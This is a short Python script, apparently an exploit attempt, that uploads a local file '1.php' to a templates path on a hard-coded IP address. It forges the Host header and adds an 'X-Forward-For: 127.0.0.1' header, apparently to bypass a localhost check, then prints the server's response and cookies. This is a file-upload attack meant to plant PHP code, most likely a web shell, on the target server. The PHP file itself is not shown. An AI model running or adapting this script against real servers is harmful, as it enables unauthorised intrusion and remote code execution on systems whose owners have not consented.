import requests



url = "http://124.71.230.22:23388/templates/index.html"
headers = {
    "Host": "124.71.230.22:23402",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla Firefox 88.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp," 
              "image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Connection": "close",
    "X-Forward-For": "127.0.0.1"
}

file = {'file': ('1.php', open('C:/Users/Administrator/Desktop/1.php', "rb"))}

res = requests.post(url=url, headers=headers, files=file)
print(res.status_code)
print(res.cookies.get_dict())
print(res.text)

